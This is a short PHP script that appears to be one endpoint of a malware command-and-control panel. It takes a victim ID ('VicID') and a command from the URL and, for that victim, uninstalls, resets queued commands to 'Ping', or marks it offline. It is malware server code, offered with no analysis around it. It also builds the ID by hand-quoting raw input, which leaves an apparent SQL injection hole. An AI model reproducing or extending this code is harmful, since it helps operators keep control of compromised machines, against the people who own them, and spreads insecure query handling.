<?php
include 'classes/database.php';
include 'classes/clients.php';
$client = new Clients;
$_GET   = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);
$Command = $_GET['command'];
$ID = "'".$_GET['VicID']."'";
switch ($Command) {
	case "Uninstall":
          $client->removeCommands($ID);           
		break;

	case "CleanCommands":
          $client->updateCommands($ID,"Ping");
		break;
		
		case "Offline":
          $client->updateStatus($ID,"Offline");
		  break;

	default:
		break;
}
?>